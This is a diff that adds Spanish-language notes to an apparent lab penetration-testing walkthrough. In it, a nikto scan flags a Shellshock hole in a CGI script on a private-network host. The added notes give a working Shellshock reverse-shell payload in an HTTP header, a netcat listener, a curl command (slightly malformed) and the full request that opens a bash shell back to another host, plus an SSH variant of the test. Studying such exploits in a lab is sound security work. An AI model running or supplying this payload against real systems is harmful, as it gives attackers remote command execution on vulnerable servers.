@@ -84,11 +84,36 @@ a@b:~# nikto -host 192.168.22.134 -output . -Format htm -useproxy 192.168.22.134
 ---------------------------------------------------------------------------
 + 1 host(s) tested
 
+>>Nota: Vulnerabilidad encontrada |/cgi-bin/status: Site appears vulnerable to the 'shellshock'|
+
+>>Nota: a través de la ruta: /cgi-bin/status tenemos ejecución de la vulnerabilidad shellshock, contra apache, ponemos netcat
+a la escucha para poder realizar una consulta reversa y introducimos esta cabecera con el payload de shellshock: x: () { :;}; /bin/bash -i >& /dev/tcp/[IP/Port] 0>&1
+
+
+a@b:~# nc -lvp [Port]
+a@b:~# curl -H 'x: () { :;}; /bin/bash –I >& /dev/tcp/[IP/Port] 0>&1'
+
+>>Nota esto generará una petición cómo esta:
+
+GET http://192.168.22.134/cgi-bin/status HTTP/1.1
+Host: 192.168.22.134
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+
+x: () { :;}; /bin/bash -i >& /dev/tcp/192.168.22.130/1234 0>&1
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+Accept-Language: es,en-US;q=0.7,en;q=0.3
+
+Accept-Encoding: gzip, deflate
+
+Connection: close
 
 
 
 
-
+intentar: por ssh con ssh www-data@192.168.22.134 '() { :;}; date'' quitando el proxy
 
 
 
